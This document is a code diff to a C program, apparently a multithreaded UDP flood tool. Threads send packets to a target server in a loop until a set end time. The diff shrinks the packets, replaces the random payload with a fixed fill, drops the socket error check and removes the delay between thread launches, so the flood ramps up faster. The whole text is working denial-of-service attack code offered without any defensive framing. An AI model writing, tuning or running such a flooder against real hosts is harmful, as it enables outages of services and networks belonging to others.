@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <time.h>
 
-#define PACKET_SIZE 1024
+#define PACKET_SIZE 64
 
 typedef struct {
     struct sockaddr_in server;
@@ -14,20 +14,13 @@ typedef struct {
 } ThreadArgs;
 
 void* udp_flood(void* arg) {
-    ThreadArgs args = *(ThreadArgs*)arg;
+    ThreadArgs* args = (ThreadArgs*)arg;
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
-
     char payload[PACKET_SIZE];
-    for (int i = 0; i < PACKET_SIZE; i++) {
-        payload[i] = rand() % 256;  // Randomized payload
-    }
+    memset(payload, 'A', PACKET_SIZE);
 
-    while (time(NULL) < args.end_time) {
-        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args.server, sizeof(args.server));
+    while (time(NULL) < args->end_time) {
+        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args->server, sizeof(args->server));
     }
 
     close(sock);
@@ -56,7 +49,6 @@ int main(int argc, char* argv[]) {
 
     for (int i = 0; i < threads; i++) {
         pthread_create(&thread_pool[i], NULL, udp_flood, &args);
-        usleep(10000);  // Small delay to avoid overwhelming system instantly
     }
 
     for (int i = 0; i < threads; i++) {
